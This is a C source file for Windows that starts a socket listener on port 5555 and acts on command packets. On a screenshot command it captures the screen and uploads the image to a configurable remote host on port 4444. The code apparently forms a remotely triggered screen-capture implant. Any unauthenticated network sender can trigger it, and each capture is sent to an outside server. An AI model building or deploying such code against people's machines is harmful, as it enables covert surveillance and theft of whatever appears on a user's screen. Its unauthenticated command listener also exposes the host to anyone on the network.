#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdint.h>

#include "lookscreen.h"

#pragma comment(lib, "ws2_32.lib")

#define SIGNAL_CAPTURE_SCREENSHOT 1
#define SIGNAL_STOP_LISTENING 2
#define SIGNAL_HEARTBEAT 3

#define SIGNAL_LISTEN_PORT 5555
#define SIGNAL_BUFFER_SIZE 512

// Structure for signal packets
typedef struct {
    UINT8 command;
    UINT32 timestamp;
    char payload[256];
} SignalPacket;


static int g_wsaInitialized = 0;
static HANDLE g_signalListenerThread = NULL;  // Keep thread handle alive
static int g_shutdownSignal = 0;              // Graceful shutdown flag

void InitializeWinsock(void) {
    if (!g_wsaInitialized) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) == 0) {
            g_wsaInitialized = 1;
            printf("[INFO] Winsock initialized\n");
        }
        else {
            fprintf(stderr, "[ERROR] WSAStartup failed\n");
        }
    }
}

void CleanupWinsock(void) {
    if (g_wsaInitialized) {
        // Signal thread to shutdown
        g_shutdownSignal = 1;

        // Wait for signal listener thread to finish
        if (g_signalListenerThread) {
            printf("[INFO] Waiting for signal listener thread to terminate...\n");
            DWORD waitResult = WaitForSingleObject(g_signalListenerThread, 5000);  // 5 second timeout
            if (waitResult == WAIT_TIMEOUT) {
                fprintf(stderr, "[WARNING] Signal listener thread did not terminate gracefully\n");
            }
            CloseHandle(g_signalListenerThread);
            g_signalListenerThread = NULL;
        }

        WSACleanup();
        g_wsaInitialized = 0;
        printf("[INFO] Winsock cleaned up\n");
    }
}

// Cloud server configuration (should be passed from main.c or loaded from config)
static char g_cloudIP[256] = "";
static uint16_t g_cloudPort = 4444;

// Set cloud server configuration (call from main.c)
void SetCloudConfig(const char* cloudIP, uint16_t cloudPort) {
    if (cloudIP) {
        strncpy_s(g_cloudIP, sizeof(g_cloudIP), cloudIP, sizeof(g_cloudIP) - 1);
        g_cloudIP[sizeof(g_cloudIP) - 1] = '\0';
    }
    g_cloudPort = cloudPort;
    printf("[INFO] Cloud config set: %s:%u\n", g_cloudIP, g_cloudPort);
}


// --- Send PNG buffer to cloud VM via TCP socket ---
int SendBufferToCloud(const BYTE* pngBuffer, DWORD bufferSize,
    const char* cloudIP, uint16_t cloudPort) {
    SOCKET sock;
    struct sockaddr_in server;
    int totalSent = 0;
    int bytesToSend;

    // Don't call WSAStartup - it's already initialized globally
    if (!g_wsaInitialized) {
        printf("[ERROR] Winsock not initialized\n");
        return 0;
    }

    // Create socket
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        printf("[ERROR] Socket creation failed. Error: %d\n", WSAGetLastError());
        return 0;
    }

    // Prepare server address
    server.sin_family = AF_INET;
    server.sin_port = htons(cloudPort);
    server.sin_addr.s_addr = inet_addr(cloudIP);

    // Connect to cloud VM
    printf("[INFO] Connecting to cloud VM at %s:%d...\n", cloudIP, cloudPort);
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("[ERROR] Connection failed. Error: %d\n", WSAGetLastError());
        closesocket(sock);
        return 0;
    }

    printf("[INFO] Connected to cloud VM.\n");

    // Send PNG size first (4 bytes, network byte order)
    DWORD networkSize = htonl(bufferSize);
    if (send(sock, (const char*)&networkSize, sizeof(networkSize), 0) == SOCKET_ERROR) {
        printf("[ERROR] Failed to send image size. Error: %d\n", WSAGetLastError());
        closesocket(sock);
        return 0;
    }

    printf("[INFO] Sending %lu bytes of PNG data...\n", (unsigned long)bufferSize);

    // Send PNG buffer in chunks
    while (totalSent < (int)bufferSize) {
        bytesToSend = (bufferSize - totalSent > 4096) ? 4096 : (bufferSize - totalSent);
        int sent = send(sock, (const char*)(pngBuffer + totalSent), bytesToSend, 0);

        if (sent == SOCKET_ERROR) {
            printf("[ERROR] Send failed. Error: %d\n", WSAGetLastError());
            closesocket(sock);
            return 0;
        }

        totalSent += sent;
        printf("[INFO] Sent %d/%lu bytes...\n", totalSent, (unsigned long)bufferSize);
    }

    printf("[INFO] Screenshot uploaded successfully.\n");

    closesocket(sock);
    return 1;
}

int SendScreenShotToCloud(const char* cloudIP, uint16_t cloudPort) {
    DWORD size = 0;
    BYTE* pngBuffer = CaptureScreen(&size);
    if (!pngBuffer) {
        printf("[ERROR] Failed to capture screen.\n");
        return 0;
    }
    int result = SendBufferToCloud(pngBuffer, size, cloudIP, cloudPort);
    free(pngBuffer);
    return result;
}

static int ProcessSignal(SignalPacket* signal) {
    switch (signal->command) {
    case SIGNAL_CAPTURE_SCREENSHOT: {
        printf("\n[INFO] Received CAPTURE_SCREENSHOT signal");
        if (strlen(g_cloudIP) == 0) {
            printf("\n[ERROR] Cloud IP not configured");
            return 1;
        }
        if (!SendScreenShotToCloud(g_cloudIP, g_cloudPort)) {
            printf("\n[ERROR] Failed to send screenshot to cloud");
        }
        return 1;
    }
    case SIGNAL_HEARTBEAT: {
        printf("\n[INFO] Received HEARTBEAT signal");
        return 1;
    }
    case SIGNAL_STOP_LISTENING: {
        printf("\n[INFO] Received STOP_LISTENING signal");
        return 0;
    }
    default:
        printf("\n[WARNING] Unknown signal command: %d", signal->command);
        return 1;
    }
}



static unsigned int __stdcall SignalListenerThread(void* arg) {
    SOCKET listenSocket = INVALID_SOCKET;
    SOCKET clientSocket = INVALID_SOCKET;
    struct sockaddr_in serverAddr;
    struct sockaddr_in clientAddr;
    int clientAddrLen = sizeof(clientAddr);
    char buffer[SIGNAL_BUFFER_SIZE];
    int recvLen;
    int running = 1;

    // Don't call WSAStartup - it's already initialized globally
    if (!g_wsaInitialized) {
        fprintf(stderr, "\n[ERROR] Winsock not initialized");
        return 1;
    }

    listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        fprintf(stderr, "\n[ERROR] Socket creation failed: %d", WSAGetLastError());
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SIGNAL_LISTEN_PORT);
    serverAddr.sin_addr.s_addr = inet_addr("0.0.0.0");

    if (bind(listenSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        fprintf(stderr, "\n[ERROR] bind failed: %d", WSAGetLastError());
        closesocket(listenSocket);
        return 1;
    }

    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
        fprintf(stderr, "\n[ERROR] listen failed: %d", WSAGetLastError());
        closesocket(listenSocket);
        return 1;
    }

    printf("\n[INFO] Signal listener started on port %d", SIGNAL_LISTEN_PORT);

    while (running) {
        clientSocket = accept(listenSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        if (clientSocket == INVALID_SOCKET) {
            fprintf(stderr, "\n[ERROR] accept failed: %d", WSAGetLastError());
            break;
        }

        printf("\n[INFO] Connected to signal sender: %s", inet_ntoa(clientAddr.sin_addr));

        recvLen = recv(clientSocket, buffer, SIGNAL_BUFFER_SIZE - 1, 0);
        if (recvLen > 0) {
            buffer[recvLen] = '\0';
            SignalPacket* signal = (SignalPacket*)buffer;

            if (recvLen >= (int)sizeof(SignalPacket)) {
                running = ProcessSignal(signal);
            }
        }else if (recvLen == 0) {
            printf("\n[INFO] Connection closed");
        }else {
            fprintf(stderr, "\n[ERROR] recv failed: %d", WSAGetLastError());
        }

        closesocket(clientSocket);
    }

    closesocket(listenSocket);
    printf("\n[INFO] Signal listener stopped");
    return 0;
}

void DetectCaptureSignals(void) {
    unsigned int threadID;
    g_signalListenerThread = (HANDLE)_beginthreadex(NULL, 0, SignalListenerThread, NULL, 0, &threadID);
    if (g_signalListenerThread) {
        printf("\n[INFO] Signal detection thread created (ID: %u).", threadID);
        // DO NOT close the handle - keep it for WaitForSingleObject
    }
    else {
        printf("\n[ERROR] Failed to create signal detection thread.");
    }
}